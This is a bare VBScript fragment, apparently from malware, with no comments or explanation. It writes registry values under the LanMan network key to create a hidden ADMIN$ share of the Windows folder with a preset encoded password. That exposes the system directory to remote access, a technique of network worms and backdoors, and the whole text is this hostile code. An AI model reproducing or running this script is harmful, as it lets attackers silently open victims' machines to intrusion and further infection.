Set V1=CreateObject("Scripting.FileSystemObject")
Set V2=V1.GetSpecialFolder(WinDir)   
Set V3=WScript.CreateObject("WScript.Shell")
V4="HKLM\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\"
V3.RegWrite V4&"ADMIN$\Flags",770,"REG_DWORD"
V3.RegWrite V4&"ADMIN$\Type",0,"REG_DWORD"
V3.RegWrite V4&"ADMIN$\Path",V2
V3.RegWrite V4&"ADMIN$\Parm1enc",-1837192444,"REG_BINARY"
